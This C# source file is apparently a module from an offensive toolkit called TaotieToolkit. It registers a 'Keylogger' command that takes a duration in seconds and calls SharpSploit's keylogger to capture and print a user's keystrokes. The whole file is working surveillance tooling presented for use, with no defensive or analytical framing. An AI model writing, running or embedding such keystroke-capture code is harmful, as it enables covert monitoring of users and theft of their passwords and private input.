using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.infogather
{
    internal class Keylogger : ICommand, ICommandMarker
    {
        public string Name => "Keylogger";
        public string Description => "Keylogger allows for the monitoring of user keystrokes.Param:second, Example:TaotieToolkit Keylogger 5";
        public void Execute(string[] args)
        {
            int result;
            if (args.Length !=1 || int.TryParse(args[0],out result) ==false) {
                Console.WriteLine("\t[!] Parameter error");
                return;
            }

            Console.WriteLine(SharpSploit.Enumeration.Keylogger.StartKeylogger(result));
        }
    }
}
